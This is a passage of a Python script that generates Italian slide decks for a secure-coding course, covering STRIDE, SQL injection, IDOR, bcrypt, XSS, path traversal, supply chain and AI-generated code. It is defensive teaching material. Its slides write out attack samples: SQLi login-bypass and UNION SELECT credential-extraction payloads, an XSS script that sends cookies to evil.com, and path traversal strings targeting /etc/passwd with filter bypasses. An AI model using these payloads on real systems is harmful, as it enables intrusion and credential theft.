        "4. Abbiamo fatto un buon lavoro? → review e iterazione",
        "",
        "Si fa PRIMA di scrivere codice. Su carta, in 30-60 minuti.",
    ], 7, total, emoji="❓")

    slide_table(prs, LL, "STRIDE — sei lettere, sei categorie",
                 ["Lettera", "Categoria", "Esempio"],
                 [
                     ["S", "Spoofing", "Fingersi qualcun altro (account takeover)"],
                     ["T", "Tampering", "Modificare dati (cookie, payload)"],
                     ["R", "Repudiation", "Negare di aver fatto un'azione"],
                     ["I", "Information Disclosure", "Esporre dati (stack trace, SQLi)"],
                     ["D", "Denial of Service", "Rendere indisponibile (DDoS)"],
                     ["E", "Elevation of Privilege", "IDOR, bypass authz"],
                 ], 8, total)

    slide_image(prs, LL, "DFD: esempio su mini-blog",
                 f"{IMG}/cap2_dfd_mini_blog.png", 9, total,
                 "Data Flow Diagram con trust boundary tra Internet/server e server/DB")

    slide_table(prs, LL, "STRIDE applicato al mini-blog",
                 ["Elemento", "STRIDE", "Minaccia", "Difesa"],
                 [
                     ["Utente", "S", "Account takeover", "bcrypt + MFA"],
                     ["Webapp", "T", "Modifica cookie", "Cookie firmato server"],
                     ["Webapp", "I", "Stack trace su 500", "Error handler generico"],
                     ["Webapp", "D", "Brute force login", "Rate limit 5/min"],
                     ["Webapp", "E", "SQLi → admin", "Query parametrizzate"],
                     ["DB", "I", "Backup esposto", "Cifratura backup"],
                     ["Flusso utente↔web", "I", "Sniffing Wi-Fi", "HTTPS"],
                 ], 10, total)

    slide_content(prs, LL, "Workshop in aula (30 min)", [
        "A coppie: applica STRIDE a un e-commerce piccolo",
        "registrazione · login · ricerca · ordine · pagamento Stripe · email",
        "",
        "Output richiesto:",
        "Disegno DFD (≥4 processi, 2 datastore, 2 trust boundary)",
        "Tabella STRIDE con ≥8 minacce sparse tra le 6 categorie",
        "Una mitigazione per ogni minaccia",
    ], 11, total, emoji="✏")

    slide_takeaway(prs, LL, [
        "OWASP Top 10: impara almeno i primi 5 a memoria",
        "CVE = identificatore, CVSS = punteggio 0-10",
        "Threat modeling = 4 domande di Shostack",
        "STRIDE = checklist sistematica, 6 categorie",
        "Trust boundary = ogni attraversamento è opportunità d'attacco",
    ], 12, total)

    slide_section(prs, LL, "03", "Per approfondire",
                   "Cosa leggere prima della prossima lezione", 13, total)

    slide_qa(prs, LL, 14, total,
              next_lesson="L3 — SQL Injection (il cuore tecnico)")

    prs.save("L2_owasp_stride.pptx")
    print("OK L2")


def make_l3():
    prs = new_pres()
    total = 15
    LL = "L3"

    slide_cover(prs, "3", "SQL Injection",
                 "La vulnerabilità #1 dal 2003. Capirla e correggerla.",
                 "Lezione 3 · 2 ore")

    slide_objectives(prs, LL, [
        "Riconoscere a vista una SQL Injection nel codice",
        "Eseguire login bypass con ' OR '1'='1' --",
        "Estrarre dati arbitrari con UNION SELECT",
        "Capire perché filtrare gli apici NON funziona",
        "Correggere con query parametrizzate (Python, Java, PHP, JS)",
    ], 2, total)

    slide_quote(prs, LL,
                 "Il database deve distinguere tra DATI e ISTRUZIONI. Se non lo fa, sei nei guai.",
                 None, 3, total)

    slide_image(prs, LL, "Codice vulnerabile",
                 f"{IMG}/cap3_sqli_vulnerable.png", 4, total,
                 "f-string che mescola struttura SQL e input utente = SQLi garantita")

    slide_image(prs, LL, "Anatomia di un attacco",
                 f"{IMG}/cap3_sqli_anatomia.png", 5, total,
                 "Login bypass in tre passi: l'attaccante non conosce la password")

    slide_image(prs, LL, "L'attacco in pratica (curl)",
                 f"{IMG}/cap3_sqli_attack.png", 6, total,
                 "Una richiesta HTTP, una sessione admin. Senza credenziali.")

    slide_code(prs, LL, "UNION SELECT — estrazione dati (peggio del bypass)",
                """# La pagina /cerca è vulnerabile a SQLi:
# sql = f"SELECT contenuto FROM messaggi WHERE contenuto LIKE '%{q}%'"

# L'attaccante cerca:
xyz' UNION SELECT email || ':' || password FROM users --

# La query diventa:
# SELECT contenuto FROM messaggi WHERE contenuto LIKE
#     '%xyz' UNION SELECT email || ':' || password FROM users --%'

# L'app mostra "messaggi"... ma in realtà mostra TUTTE le password:
#   alice@bank.it:alice_pass
#   bob@bank.it:bob_pass
#   admin@bank.it:Sup3rS3gr3t0!

# In UNA richiesta: TUTTO il database password rubato.""",
                7, total, lang_label="sql", bad=True,
                note="Login bypass + UNION SELECT = takeover di ogni account in <30 secondi")

    slide_section(prs, LL, "02", "La correzione",
                   "Separare struttura SQL da dati. Sempre.", 8, total)

    slide_image(prs, LL, "Versione corretta",
                 f"{IMG}/cap3_sqli_safe.png", 9, total,
                 "Query parametrizzata: il driver tratta i dati come VALORI, mai come SQL")

    slide_two_col(prs, LL, "Filtrare gli apici NON funziona",
                   "Tentativo ingenuo",
                   ["s = s.replace(\"'\", \"\")",
                    "Sembra di essere protetti...",
                    "",
                    "Bypass:",
                    "  %27 (URL encoded)",
                    "  \\\\' (escape)",
                    "  \" (doppi apici)",
                    "  ʼ (Unicode lookalike)",
                    "  1 OR 1=1 (numerica)"],
                   "Soluzione corretta",
                   ["Query parametrizzate",
                    "Separi STRUTTURA da DATI",
                    "",
                    "Il driver tratta i dati",
                    "come VALORI, mai come SQL",
                    "",
                    "Anche con QUALUNQUE input,",
                    "non viene interpretato",
                    "",
                    "Whitelist > Blacklist (sempre)"],
                   10, total)

    slide_table(prs, LL, "Cross-linguaggio: la stessa idea",
                 ["Linguaggio", "Pattern parametrizzato"],
                 [
                     ["Python sqlite3", "cursor.execute(\"... = ?\", (val,))"],
                     ["Python psycopg2", "cursor.execute(\"... = %s\", (val,))"],
                     ["Java JDBC", "ps = conn.prepareStatement(\"... = ?\")"],
                     ["PHP PDO", "$stmt = $pdo->prepare(\"... = ?\")"],
                     ["JS better-sqlite3", "db.prepare(\"... = ?\").get(val)"],
                     ["ORM (SQLAlchemy, ...)", "User.query.filter_by(email=email).first()"],
                 ], 11, total)

    slide_content(prs, LL, "Difese in profondità", [
        "1. Query parametrizzate (difesa PRIMARIA, non sostituibile)",
        "2. ORM (forza il pattern corretto)",
        "3. Least privilege per l'utente DB (no DROP/CREATE/GRANT)",
        "4. Errori generici al client, dettagli nei log interni",
        "5. WAF (Web Application Firewall) come strato aggiuntivo",
        "6. Rate limiting sul login (anti brute force)",
        "7. Audit log dei tentativi sospetti",
    ], 12, total, emoji="🛡")

    slide_takeaway(prs, LL, [
        "SQLi è la #1 dal 2003: Equifax, Heartland, TalkTalk",
        "Mai f-string in SQL. Mai concatenazione. Sempre placeholder ?",
        "Filtrare gli apici è una strategia perdente",
        "ORM è più sicuro per default",
        "Difese stratificate: 7 livelli di protezione",
    ], 13, total)

    slide_section(prs, LL, "03", "Laboratorio",
                   "Mini-banca: app vulnerabile → la sfrutti → la correggi",
                   14, total)

    slide_qa(prs, LL, 15, total,
              next_lesson="L4 — IDOR + password hashing (bcrypt)")

    prs.save("L3_sql_injection.pptx")
    print("OK L3")


def make_l4():
    prs = new_pres()
    total = 15
    LL = "L4"

    slide_cover(prs, "4", "Autorizzazione e password",
                 "IDOR, status code, bcrypt — gli errori più costosi",
                 "Lezione 4 · 2 ore")

    slide_objectives(prs, LL, [
        "Distinguere autenticazione da autorizzazione",
        "Riconoscere e correggere un IDOR",
        "Usare correttamente status code 401, 403, 404",
        "Capire perché MD5/SHA NON vanno per password",
        "Hashare correttamente con bcrypt",
    ], 2, total)

    slide_two_col(prs, LL, "Authentication vs Authorization",
                   "AUTHN — sei tu?",
                   ["Si verifica al LOGIN",
                    "Username + password",
                    "Token, MFA",
                    "Esempio: 'sei Mario, ok'",
                    "",
                    "Errore tipico:",
                    "login con password rubata"],
                   "AUTHZ — cosa puoi fare?",
                   ["Si verifica a OGNI richiesta",
                    "Ruoli, permessi",
                    "Ownership check",
                    "Esempio: 'Mario può vedere fattura 42?'",
                    "",
                    "Errore tipico:",
                    "IDOR — vedi dati di altri"],
                   3, total,
                   left_color=COL_ACCENT, right_color=COL_PRIMARY)

    slide_section(prs, LL, "01", "IDOR",
                   "Insecure Direct Object Reference (OWASP A01)",
                   4, total)

    slide_content(prs, LL, "Caso reale italiano — 100.000€ di multa",
                   [
                       "2022, e-commerce italiano",
                       "URL /ordine/<id> non protetti",
                       "Cambiando l'ID nell'URL si vedevano ordini di altri clienti",
                       "  con indirizzi, prodotti, importi, IBAN",
                       "",
                       "Sanzione Garante Privacy: ~100.000€",
                       "GDPR Art. 25 (Privacy by Design) + Art. 32 (sicurezza)",
                       "",
                       "Una sola riga di codice in più avrebbe evitato tutto questo",
                   ], 5, total,
                   subtitle="Provvedimento Garante: dati personali esposti senza ownership check",
                   emoji="⚖")

    slide_image(prs, LL, "Soluzione: ownership check",
                 f"{IMG}/cap4_idor_safe.png", 6, total,
                 "filter_by(owner_id=...) è la riga che evita una multa da 100k€")

    slide_table(prs, LL, "Status code: 401 vs 403 vs 404",
                 ["Code", "Significato", "Quando usarlo"],
                 [
                     ["401 Unauthorized", "Non autenticato", "Manca login / token scaduto"],
                     ["403 Forbidden", "Autenticato ma senza permessi", "User normale → /admin"],
                     ["404 Not Found", "Risorsa inesistente", "URL inesistente"],
                 ], 7, total)

    slide_section(prs, LL, "02", "Password hashing",
                   "Encoding ≠ Hashing ≠ Encryption — la differenza fondamentale",
                   8, total)

    slide_two_col(prs, LL, "Tre operazioni DIVERSE",
                   "❌ NO per password",
                   ["ENCODING (Base64)",
                    "  Reversibile, banale",
                    "  Serve per trasporto",
                    "",
                    "ENCRYPTION (AES)",
                    "  Reversibile con chiave",
                    "  Se rubano chiave: disastro"],
                   "✅ SÌ per password",
                   ["HASHING (bcrypt, Argon2id)",
                    "  NON reversibile",
                    "  Salt automatico",
                    "  Work factor lento",
                    "",
                    "  bcrypt cost=12 ≈ 250ms",
                    "  Utente: impercettibile",
                    "  Attaccante: devastante"],
                   9, total)

    slide_content(prs, LL, "Perché MD5/SHA-256 NON vanno", [
        "Velocità: SHA-256 su GPU = miliardi/secondo",
        "  Rubato il DB, brute force in poche ore",
        "",
        "Rainbow tables: senza salt, password identiche → hash identici",
        "  Tabelle pre-calcolate di password comuni",
        "",
        "MD5 e SHA-1: collisioni note. Morti definitivamente.",
        "",
        "bcrypt e Argon2id sono progettati apposta per essere LENTI",
    ], 10, total, emoji="⏱")

    slide_image(prs, LL, "bcrypt: l'implementazione corretta",
                 f"{IMG}/cap4_bcrypt.png", 11, total,
                 "Una riga di codice. Salt automatico. Cost configurabile.")

    slide_table(prs, LL, "Diagnosi visiva: apri il DB",
                 ["Cosa vedi nella colonna password", "Diagnosi"],
                 [
                     ["mariopwd (testo)", "🔥 CHIARO — catastrofico"],
                     ["5f4dcc3b5aa765... (32 hex)", "🔥 MD5 — morto"],
                     ["5baa61e4c9b93f... (40 hex)", "🔥 SHA-1 — morto"],
                     ["e3b0c44298fc1c... (64 hex)", "⚠ SHA-256 — inadeguato"],
                     ["$2b$12$KIXbN...", "✅ bcrypt — OK"],
                     ["$argon2id$v=19$...", "✅ Argon2id — ottimo"],
                 ], 12, total)

    slide_takeaway(prs, LL, [
        "Authn ≠ Authz — sono due cose diverse",
        "IDOR: caso reale italiano, 100k€ di multa",
        "401 = non autenticato, 403 = non autorizzato",
        "Mai MD5/SHA per password — usa bcrypt o Argon2id",
        "Apri il DB con DB Browser: il visivo è dirimente",
    ], 13, total)

    slide_section(prs, LL, "03", "Laboratorio",
                   "Aggiungere ownership check e migrare a bcrypt",
                   14, total)

    slide_qa(prs, LL, 15, total,
              next_lesson="L5 — XSS + header HTTP di sicurezza")

    prs.save("L4_idor_password.pptx")
    print("OK L4")


def make_l5():
    prs = new_pres()
    total = 16
    LL = "L5"

    slide_cover(prs, "5", "XSS e header HTTP di sicurezza",
                 "JavaScript dell'attaccante nel browser della vittima",
                 "Lezione 5 · 2 ore")

    slide_objectives(prs, LL, [
        "Cos'è Cross-Site Scripting (XSS) e i suoi 3 tipi",
        "Eseguire XSS Reflected e XSS Stored",
        "Difendersi con escape automatico (Jinja2)",
        "Conoscere i 6 header HTTP di sicurezza fondamentali",
        "Configurare cookie sicuri (Secure, HttpOnly, SameSite)",
    ], 2, total)

    slide_content(prs, LL, "Una storia: il commento 'rilanciato'",
                   [
                       "Immagina un forum dove gli utenti pubblicano commenti",
                       "Un utente cattivo pubblica un commento che CONTIENE codice:",
                       "",
                       "  'Bel post! <script>fetch(\"evil.com?c=\"+document.cookie)</script>'",
                       "",
                       "Il forum lo salva pensando sia testo",
                       "Quando un altro utente apre la pagina, il SUO browser:",
                       "  1. Legge il commento dal DB",
                       "  2. Trova <script>...</script> e lo ESEGUE",
                       "  3. Manda il SUO cookie di sessione all'attaccante",
                   ], 3, total,
                   subtitle="Senza chiedere password, l'attaccante ha l'identità della vittima",
                   emoji="📖")

    slide_quote(prs, LL,
                 "XSS = il JavaScript dell'attaccante eseguito nel browser della tua vittima.",
                 None, 4, total)

    slide_content(prs, LL, "Come funziona un browser", [
        "1. Scarica HTML della pagina",
        "2. Applica CSS",
        "3. Trova tag <script> e li ESEGUE",
        "4. Permette al JS di accedere a DOM, cookie, fare richieste",
        "",
        "Se l'attaccante riesce a far eseguire del SUO JS nella tua pagina:",
        "→ ha accesso a cookie sessione, dati form, può agire come l'utente",
    ], 5, total, emoji="🌐")

    slide_content(prs, LL, "I 3 tipi di XSS", [
        "REFLECTED — il payload è nell'URL, riflesso nella pagina",
        "  Vittima: chi clicca il link malevolo",
        "",
        "STORED — il payload è salvato nel DB (commenti, post)",
        "  Vittima: chiunque visita la pagina (più grave)",
        "",
        "DOM-BASED — JS della pagina prende valore da location.hash",
        "  Più raro, più subdolo",
    ], 6, total)

    slide_image(prs, LL, "Flusso di un attacco XSS Stored",
                 f"{IMG}/cap5_xss_flow.png", 7, total,
                 "Dal commento malevolo al furto del cookie di sessione")

    slide_code(prs, LL, "Difesa: escape automatico (Jinja2)",
                """<!-- Template Jinja2 -->
<h1>Risultati per: {{ query }}</h1>

# Se query = "<script>alert(1)</script>"
# Jinja2 trasforma in: &lt;script&gt;alert(1)&lt;/script&gt;
# Il browser mostra come TESTO, NON esegue → XSS neutralizzata

# Equivalenti:
# Java + Thymeleaf:  <span th:text="${query}"></span>
# PHP + Twig:        {{ query }}
# React:             {query}""",
                8, total, lang_label="jinja", bad=False,
                note="Default escape è SEMPRE attivo. Non disabilitarlo con |safe.")

    slide_content(prs, LL, "Il pericolo del |safe", [
        "Jinja2: {{ comment | safe }}",
        "Disabilita l'escape → XSS GARANTITA su input utente",
        "",
        "Equivalenti pericolosi in altri framework:",
        "  Vue: v-html",
        "  React: dangerouslySetInnerHTML",
        "  Blade: {!! $x !!}",
        "",
        "Usali solo su testo statico che hai scritto TU.",
        "Mai, MAI, MAI su input utente.",
    ], 9, total, emoji="⚠")

    slide_code(prs, LL, "Quando l'utente DEVE scrivere HTML ricco: bleach",
                """# Scenario: commenti con grassetto/corsivo/link → escape NON va
# Soluzione: sanitization con bleach (whitelist tag+attributi)

import bleach

ALLOWED_TAGS = ["p", "b", "strong", "i", "em", "a", "br"]
ALLOWED_ATTRS = {"a": ["href"]}
ALLOWED_PROTO = ["http", "https"]

safe_html = bleach.clean(user_html,
                          tags=ALLOWED_TAGS,
                          attributes=ALLOWED_ATTRS,
                          protocols=ALLOWED_PROTO,
                          strip=True)

# Input:  <p>Ciao <script>alert(1)</script><a href="javascript:..">x</a></p>
# Output: <p>Ciao <a>x</a></p>     ← script rimosso, href javascript: rimosso""",
                10, total, lang_label="python", bad=False,
                note="bleach mantiene tag voluti, butta tutto il resto. JS in DOMPurify.")

    slide_section(prs, LL, "02", "Header HTTP di sicurezza",
                   "Configurazione rapida, difese potenti", 11, total)

    slide_table(prs, LL, "I 6 header di sicurezza",
                 ["Header", "Cosa fa"],
                 [
                     ["Strict-Transport-Security", "Forza HTTPS dopo prima visita (HSTS)"],
                     ["Content-Security-Policy", "Limita risorse caricabili (anti-XSS L2)"],
                     ["X-Frame-Options: DENY", "Blocca clickjacking via iframe"],
                     ["X-Content-Type-Options: nosniff", "Blocca MIME sniffing"],
                     ["Referrer-Policy", "Controlla cosa va nel Referer"],
                     ["Permissions-Policy", "Limita API browser (camera, mic)"],
                 ], 12, total)

    slide_code(prs, LL, "Cookie sicuri",
                """# Configurazione Flask
app.config.update(
    SESSION_COOKIE_SECURE=True,      # Solo HTTPS
    SESSION_COOKIE_HTTPONLY=True,     # JS NON può leggerlo (anti-XSS)
    SESSION_COOKIE_SAMESITE="Lax",    # Anti-CSRF
    PERMANENT_SESSION_LIFETIME=3600,
)

# Risultato:
# Set-Cookie: session=abc;
#             Secure; HttpOnly; SameSite=Lax;
#             Path=/; Max-Age=3600""",
                13, total, lang_label="python", bad=False,
                note="3 attributi + 1 config = -90% rischio session hijacking")

    slide_takeaway(prs, LL, [
        "XSS = JavaScript dell'attaccante eseguito nel browser",
        "3 tipi: Reflected, Stored (peggiore), DOM-based",
        "Jinja2 fa escape di default — NON disabilitarlo",
        "Per HTML ricco voluto: bleach con whitelist",
        "Cookie sessione: Secure + HttpOnly + SameSite (sempre)",
    ], 14, total)

    slide_section(prs, LL, "03", "Lab + sicurezza headers",
                   "Test del proprio sito con securityheaders.com", 15, total)

    slide_qa(prs, LL, 16, total,
              next_lesson="L6 — Input validation + Supply chain")

    prs.save("L5_xss_header.pptx")
    print("OK L5")


def make_l6():
    prs = new_pres()
    total = 15
    LL = "L6"

    slide_cover(prs, "6", "Input validation e supply chain",
                 "Pydantic, path traversal, il rischio delle dipendenze",
                 "Lezione 6 · 2 ore")

    slide_objectives(prs, LL, [
        "Distinguere validation, sanitization e encoding",
        "Capire perché whitelist > blacklist",
        "Usare Pydantic per validation strutturata in Python",
        "Riconoscere e correggere il path traversal",
        "Scoprire CVE nelle dipendenze con pip-audit",
        "Comprendere SBOM e Cyber Resilience Act (2027)",
    ], 2, total)

    slide_table(prs, LL, "Validation vs Sanitization vs Encoding",
                 ["Operazione", "Cosa fa", "Quando si usa"],
                 [
                     ["Validation", "Verifica + rifiuta", "All'ENTRATA"],
                     ["Sanitization", "Modifica + tiene", "Per struttura ricca (HTML)"],
                     ["Encoding", "Trasforma all'uscita", "All'USCITA, per contesto"],
                 ], 3, total)

    slide_two_col(prs, LL, "Whitelist vs Blacklist",
                   "BLACKLIST (anti-pattern)",
                   ["s.replace(\"'\", \"\")",
                    "Blocco questi caratteri",
                    "",
                    "Problemi:",
                    "  lista sempre incompleta",
                    "  bypass con encoding",
                    "  bypass con Unicode",
                    "  l'attaccante è creativo",
                    "",
                    "Strategia perdente"],
                   "WHITELIST (corretto)",
                   ["regex r\"^[a-zA-Z0-9_]{3,20}$\"",
                    "Accetto solo questi",
                    "",
                    "Vantaggi:",
                    "  definito ed esplicito",
                    "  rifiuta tutto il resto",
                    "  aggiungi consapevolmente",
                    "",
                    "",
                    "Strategia robusta"],
                   4, total)

    slide_section(prs, LL, "01", "Pydantic",
                   "Validation strutturata, type-safe, dichiarativa", 5, total)

    slide_image(prs, LL, "Pydantic — esempio completo",
                 f"{IMG}/cap6_pydantic.png", 6, total,
                 "Modello con type hints, vincoli, e validator custom")

    slide_section(prs, LL, "02", "Path Traversal",
                   "Quando un parametro filename diventa una porta aperta",
                   7, total)

    slide_code(prs, LL, "Codice vulnerabile (path traversal)",
                """@app.route("/download")
def download():
    filename = request.args.get("file")
    return send_file(f"./uploads/{filename}")

# Attacco: GET /download?file=../etc/passwd
# Path costruito: ./uploads/../etc/passwd
# OS lo risolve a: /etc/passwd
# → L'attaccante legge file di sistema

# Bypass del filtro ingenuo:
#   ../../etc/passwd       (più livelli)
#   ....//....//etc/passwd (filtro ../ ingenuo)
#   ..%2f..%2fetc%2fpasswd (URL encoded)""",
                8, total, lang_label="python", bad=True,
                note="Vale anche per /var/myapp/secrets, /home/user/.ssh/id_rsa, ...")

    slide_code(prs, LL, "Correzione: 3 controlli obbligatori",
                """import os
from flask import abort, send_from_directory

UPLOAD_DIR = os.path.realpath("./uploads")
ALLOWED_EXTS = {".pdf", ".png", ".jpg"}

@app.route("/download")
@login_required
def download():
    filename = request.args.get("file", "")
    # 1) Whitelist: niente separatori
    if "/" in filename or "\\\\" in filename or filename.startswith("."):
        abort(400)
    # 2) Whitelist estensione
    if os.path.splitext(filename)[1].lower() not in ALLOWED_EXTS:
        abort(400)
    # 3) realpath + startswith
    full = os.path.realpath(os.path.join(UPLOAD_DIR, filename))
    if not full.startswith(UPLOAD_DIR + os.sep):
        abort(403)
    return send_from_directory(UPLOAD_DIR, filename, as_attachment=True)""",
                9, total, lang_label="python", bad=False,
                note="Quattro righe di controllo, tre attacchi neutralizzati")

    slide_section(prs, LL, "03", "Supply chain",
                   "Il tuo codice è il 5%. Il resto sono dipendenze.",
                   10, total)

    slide_content(prs, LL, "Caso reale: Log4Shell (dicembre 2021)", [
        "CVE-2021-44228 — Log4j (libreria logging Java)",
        "CVSS: 10.0 (massimo)",
        "Stringa nel User-Agent → RCE sul server",
        "",
        "Impatto: ~10% dei server enterprise al mondo",
        "Mezza Internet ha patchato in emergenza per 2 settimane",
        "",
        "Chi aveva SBOM: identificato in 5 minuti dove era vulnerabile",
    ], 11, total, emoji="📦")

    slide_image(prs, LL, "pip-audit in azione",
                 f"{IMG}/cap6_pip_audit.png", 12, total,
                 "Trovi le CVE → aggiorni → zero vulnerabilità")

    slide_content(prs, LL, "SBOM e Cyber Resilience Act (dicembre 2027)",
                   [
                       "SBOM = Software Bill of Materials",
                       "  Lista completa delle dipendenze del prodotto (versioni, hash)",
                       "  Formati: CycloneDX, SPDX",
                       "",
                       "Cyber Resilience Act (Reg. UE 2024/2847):",
                       "  In vigore pieno: DICEMBRE 2027",
                       "  Per ogni 'prodotto digitale' venduto in UE",
                       "",
                       "Obblighi: SBOM pubblicato · niente CVE note alla vendita",
                       "         · patching ≥5 anni · notifica 24h vulnerabilità sfruttate",
                       "         · sanzioni fino a 15M€ o 2,5% fatturato",
                   ], 13, total,
                   subtitle="Iniziate a familiarizzare con pip-audit e cyclonedx-bom ADESSO",
                   emoji="📜")

    slide_takeaway(prs, LL, [
        "Validation, sanitization, encoding: cose DIVERSE",
        "Whitelist sempre. Blacklist mai.",
        "Pydantic per validation strutturata in Python",
        "Path traversal: 3 controlli obbligatori (whitelist, ext, realpath)",
        "pip-audit + SBOM obbligatori dal 2027 (CRA)",
    ], 14, total)

    slide_qa(prs, LL, 15, total,
              next_lesson="L7 — Documentazione sicurezza + uso responsabile AI")

    prs.save("L6_validation_supply.pptx")
    print("OK L6")


def make_l7():
    prs = new_pres()
    total = 16
    LL = "L7"

    slide_cover(prs, "7", "Documentazione e uso dell'IA",
                 "SECURITY.md, AI come assistente, validare codice generato",
                 "Lezione 7 · 2 ore")

    slide_objectives(prs, LL, [
        "Capire perché documentare la sicurezza è un requisito",
        "Strutturare un documento SECURITY.md per un progetto",
        "Conoscere i 7 errori tipici del codice generato da IA",
        "Applicare il workflow di validazione in 4 step",
        "Sapere quando NON usare l'IA",
    ], 2, total)

    slide_section(prs, LL, "01", "Documentazione di sicurezza",
                   "GDPR Art. 32 chiede 'misure tecniche adeguate'. Le devi sapere elencare.",
                   3, total)

    slide_content(prs, LL, "Documentare: 3 motivi", [
        "1. REQUISITO LEGALE",
        "   GDPR Art. 32 · NIS 2 Art. 21 · CRA (2027)",
        "",
        "2. REQUISITO OPERATIVO",
        "   Nuovi sviluppatori sanno cosa è stato fatto",
        "   Auditor verificano in mezza giornata",
        "",
        "3. REQUISITO POST-INCIDENT",
        "   Sapere dove sono le contromisure attive",
    ], 4, total, emoji="📋")

    slide_table(prs, LL, "Template SECURITY.md — 9 sezioni",
                 ["#", "Sezione"],
                 [
                     ["1", "Informazioni generali (progetto, owner, dati)"],
                     ["2", "Threat model (DFD + tabella STRIDE)"],
                     ["3", "Controlli applicati"],
                     ["4", "Vulnerabilità note e debt tecnico"],
                     ["5", "Test di sicurezza"],
                     ["6", "Incident response"],
                     ["7", "Compliance (GDPR, NIS 2, CRA)"],
                     ["8", "Approvazione e revisione"],
                     ["9", "Allegati"],
                 ], 5, total)

    slide_section(prs, LL, "02", "Uso responsabile dell'IA",
                   "Copilot, Claude, ChatGPT, Cursor: moltiplicatori di produttività... e di errori",
                   6, total)

    slide_quote(prs, LL,
                 "L'IA non sa di sicurezza. Tu devi.",
                 None, 7, total)

    slide_content(prs, LL, "Il problema in numeri", [
        "Studi GitHub (2022), Stanford (2023):",
        "",
        "~40% dei suggerimenti Copilot in scenari di sicurezza",
        "contengono vulnerabilità",
        "",
        "Gli sviluppatori con AI scrivono codice MENO sicuro,",
        "ma sono PIÙ CONVINTI che sia sicuro (bias cognitivo)",
        "",
        "Tradotto: l'IA è uno strumento potente, non un revisore di sicurezza",
    ], 8, total, emoji="⚠")

    slide_table(prs, LL, "I 7 errori tipici del codice IA",
                 ["#", "Errore", "Soluzione"],
                 [
                     ["1", "SQL Injection con f-string", "Query parametrizzate"],
                     ["2", "Hash deboli (SHA-256) per password", "bcrypt / Argon2id"],
                     ["3", "Manca authorization check", "Ownership check"],
                     ["4", "Template senza escape", "Jinja2/Twig auto-escape"],
                     ["5", "CORS troppo permissivo (origins: '*')", "Whitelist origini"],
                     ["6", "Catch-all che falliscono in modo aperto", "Fail Secure"],
                     ["7", "Segreti hardcoded ('change-me')", "Env var"],
                 ], 9, total)

    slide_content(prs, LL, "Workflow di validazione (4 step)", [
        "1. LEGGI E CAPISCI (30 sec)",
        "   Non sapresti spiegarlo? Non accettare.",
        "",
        "2. SCANSIONA PATTERN (1 min)",
        "   f-string in SQL? eval? hash deboli? cookie?",
        "",
        "3. VERIFICA CONTESTO (1-2 min)",
        "   Coerente con architettura, versioni, convenzioni?",
        "",
        "4. TEST + LINTER (5-15 min)",
        "   pytest + bandit/semgrep + pip-audit",
    ], 10, total, emoji="🔍")

    slide_two_col(prs, LL, "Prompting per la sicurezza: vago vs specifico",
                   "❌ Prompt VAGO (rischioso)",
                   ["'Scrivi un endpoint Flask",
                    "per login'",
                    "",
                    "L'IA produce la versione",
                    "MEDIA: spesso vulnerabile",
                    "",
                    "Risultato tipico:",
                    "  password con SHA-256",
                    "  nessun rate limit",
                    "  cookie senza HttpOnly",
                    "  query con f-string"],
                   "✅ Prompt SPECIFICO (sicuro)",
                   ["'Scrivi /login POST che:",
                    "- bcrypt per password",
                    "- risposta uniforme",
                    "  (no user enumeration)",
                    "- rate limit 5/min",
                    "- cookie Secure+HttpOnly",
                    "  +SameSite=Lax",
                    "- logga eventi auth in",
                    "  formato JSON ECS'",
                    "",
                    "Risultato vicino a giusto"],
                   11, total)

    slide_content(prs, LL, "Quando NON usare l'IA", [
        "Crittografia 'fatta in casa' (usa librerie standard)",
        "Codice di sicurezza critico (authn/authz)",
        "Compliance e legale (privacy policy, validation IBAN/CF)",
        "Quando NON sai validare (impara prima)",
        "",
        "Caso reale: Samsung 2023",
        "Dipendenti incollarono codice proprietario in ChatGPT",
        "OpenAI lo usò per training → codice leakato indirettamente",
        "Samsung dovette vietare ChatGPT internamente",
    ], 12, total, emoji="🛑")

    slide_content(prs, LL, "EU AI Act — la cornice normativa",
                   [
                       "Regolamento (UE) 2024/1689 — in vigore agosto 2024",
                       "Piena applicazione: agosto 2026 — alcune disposizioni 2027",
                       "",
                       "Approccio risk-based: 4 categorie",
                       "  Rischio INACCETTABILE → vietati (social scoring, ecc.)",
                       "  Rischio ALTO → obblighi stringenti (recruitment, scoring credito)",
                       "  Rischio LIMITATO → trasparenza (chatbot, deepfake)",
                       "  Rischio MINIMO → liberi (la maggioranza)",
                       "",
                       "Per chi USA AI per scrivere codice: nessun obbligo diretto",
                       "Per chi INTEGRA AI ad alto rischio in prodotti: documentazione,",
                       "trasparenza, supervisione umana, dataset governance",
                   ], 13, total,
                   subtitle="Sanzioni fino a 35M€ o 7% fatturato per sistemi proibiti",
                   emoji="⚖")

    slide_takeaway(prs, LL, [
        "Documentare la sicurezza è un REQUISITO legale e operativo",
        "SECURITY.md versionato con il codice",
        "L'IA non sa di sicurezza: validare ogni suggerimento",
        "Prompt specifici = codice più sicuro per default",
        "EU AI Act dal 2026: documentazione + supervisione umana",
    ], 14, total)

    slide_section(prs, LL, "03", "Lab in aula",
                   "Validation collettiva di codice AI vulnerabile", 15, total)

    slide_qa(prs, LL, 16, total,
              next_lesson="L8 — Lab integrato finale")

    prs.save("L7_documentazione_ai.pptx")
    print("OK L7")


def make_l8():
    prs = new_pres()
    total = 14
    LL = "L8"

    slide_cover(prs, "8", "Lab integrato finale",
                 "Sei un junior security analyst. Trova le vulnerabilità.",
                 "Lezione 8 · 2 ore — VERIFICA")

    slide_section(prs, LL, "01", "Lo scenario",
                   "BancaPiccola. Tu, junior security analyst. 80 minuti.",
                   2, total)

    slide_content(prs, LL, "Cosa farai oggi", [
        "Hai imparato 7 capitoli di secure coding",
        "Oggi APPLICHI tutto su un'app vera, in 80 minuti",
        "",
        "SCENARIO:",
        "Sei un junior security analyst",
        "Ti viene affidata una piccola app per una review prima del rilascio",
        "Output: mini-report scritto",
    ], 3, total, emoji="🎯")

    slide_two_col(prs, LL, "Regole del lab",
                   "✅ PERMESSO",
                   ["Leggere il codice sorgente",
                    "DevTools, curl, sqlite3, DB Browser",
                    "Lavorare a coppie",
                    "1 hint gratis dal docente",
                    "Consultare le dispense"],
                   "🚫 NON PERMESSO",
                   ["Aprire la versione corretta",
                    "Cercare la soluzione su Google",
                    "Copiare il report",
                    "2° hint costa -5% sul voto",
                    ""],
                   4, total,
                   left_color=COL_OK, right_color=COL_DANGER)

    slide_content(prs, LL, "Cheat-sheet di campo (1)", [
        "SQL Injection?",
        "  Form login, ricerca, parametri in WHERE",
        "  Test: '   ' OR '1'='1'   admin' --",
        "",
        "IDOR?",
        "  URL con ID numerici (/fattura/42)",
        "  Cambia l'ID, vedi se accedi",
